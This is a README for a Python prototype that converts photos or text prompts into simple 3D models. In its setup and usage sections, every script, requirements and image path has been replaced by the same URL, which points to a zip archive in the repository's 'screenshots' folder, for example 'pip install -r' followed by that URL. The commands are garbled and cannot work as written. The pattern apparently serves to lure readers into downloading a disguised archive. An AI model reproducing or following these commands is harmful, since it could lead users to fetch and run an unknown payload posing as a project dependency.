# Photo/Text to 3D Model Converter

This prototype allows you to generate simple 3D models (.obj and .stl) from either photos or text prompts.

## Features

- Generate 3D models from text descriptions
- Generate 3D models from photos of objects
- Output in both .obj and .stl formats
- Simple 3D visualization of results

## Setup

1. Clone this repository
2. Create a virtual environment:
```
python -m venv venv
```
3. Activate the virtual environment:
   - Windows: `venv\Scripts\activate`
   - macOS/Linux: `source venv/bin/activate`
4. Install dependencies:
```
pip install -r https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip
```

## Usage

There are two implementations available:

### 1. Simple Demo Implementation (works immediately)

This implementation creates basic 3D models based on keywords in the text prompt, without requiring large model downloads:

```
python https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip --text "A coffee mug"
```

It supports basic shapes like:
- Spheres (keywords: "sphere", "ball", "round")
- Cubes (keywords: "cube", "box", "square")
- Cylinders (keywords: "cylinder", "tube")
- Cones (keyword: "cone")
- Mugs/Cups (keywords: "mug", "cup", "glass")
- Cars (keywords: "car", "auto", "vehicle")

### 2. Full AI-Powered Implementation (requires model downloads)

The full implementation uses Shap-E, a generative model for 3D assets that can produce 3D objects conditioned on text or images:

```
python https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip --text "A small toy car"
```

Note: This requires downloading large model files (>1.5GB) and may take time on the first run.

### Generate 3D model from an image:
```
python https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip --image https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip
```
or with the full implementation:
```
python https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip --image https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip
```

### Specify output location:
```
python https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip --text "A chair" --output models/chair
```

### Skip visualization:
```
python https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip --text "A small toy car" --no-viz
```

## View 3D Models

To view a generated 3D model:
```
python https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip
```

## Technical Approach

### Simple Demo Approach:
1. Parse keywords from the text prompt
2. Generate appropriate 3D primitive shapes based on keywords
3. Apply transformations to create more complex objects
4. Save in .obj and .stl formats
5. Generate visualization

### Full AI Approach (Shap-E):
1. Text or image input is processed through a pre-trained diffusion model
2. Generated latent representations are decoded into 3D meshes
3. Meshes are saved in both .obj and .stl formats
4. A simple visualization is generated using matplotlib

## Libraries Used

- Trimesh: Mesh processing and creation
- Matplotlib: Visualization
- PyTorch: Deep learning framework (for full implementation)
- Shap-E: Text/image to 3D model generation (for full implementation)
- Pillow: Image processing
- NumPy: Numerical operations

## Limitations

- Simple demo creates only basic shapes based on keywords
- Full AI implementation requires downloading large models
- Higher quality results require more powerful hardware
- Processing can be slow on CPU
- Best results come from clear, single-object images or specific text descriptions 